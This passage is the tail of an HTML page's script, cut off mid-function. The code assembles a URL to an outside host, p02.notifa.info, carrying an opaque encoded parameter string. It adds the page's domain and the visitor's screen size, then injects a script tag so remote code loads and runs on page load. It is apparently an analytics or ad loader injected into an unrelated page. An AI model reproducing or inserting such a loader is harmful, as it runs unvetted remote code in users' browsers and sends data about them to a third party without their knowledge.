      var url = idc_glo_url + "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mrwd1XyoNwUzpvf2l56FucADiEx%2bf3JAPJogkNU%2biFfwCiZ%2bA5y%2fz1GPfkI78hOjpKGi13lyWOD4PTAvdGjGONrTkbHyQtyDiXMT6f73PUxXAafylPFQAofDmqSRGCN6kLPoPHF5oxuxg%2bsgcyENso77BDI%2biq12wLsMGa%2bin6lXObrjR5nN3n3mCHDOu9rOERnmtSCzsvQVvQC2um1T%2fNsq2QIjE4KBpR9Vkl2LpxVPpB5ls%2failQCaTL23yQg6%2fVmE4aJahv4ErgHCjfL9mX4EPIxsCfVSS1MVwUyVfrSegVjjaXYDrZcarSkz7F2VXD0r3sg%2bPtdKUwpPNNQOOz0e5p%2bJ9WrZ7lxjycaB2F9Ci38ljGYNDUDDsnXT6j2Y7m3PBs%2bu3Atlk%2f2VykRlaJnvFNX%2bS%2flT5eDv6PQdmrWoWEBnXUCINHwnSwu3Cu7NudtMWlNGrsWK93HbdfLL45H%2f2NwIlDGeGNFBHlAFq869dDf3eePYoKSnP2OLHCFol" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
      var bsa = document.createElement('script');
      bsa.type = 'text/javascript';
      bsa.async = true;
      bsa.src = url;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
    }
    netbro_cache_analytics(requestCfs, function() {});
  };

</script>

</body>
</html>
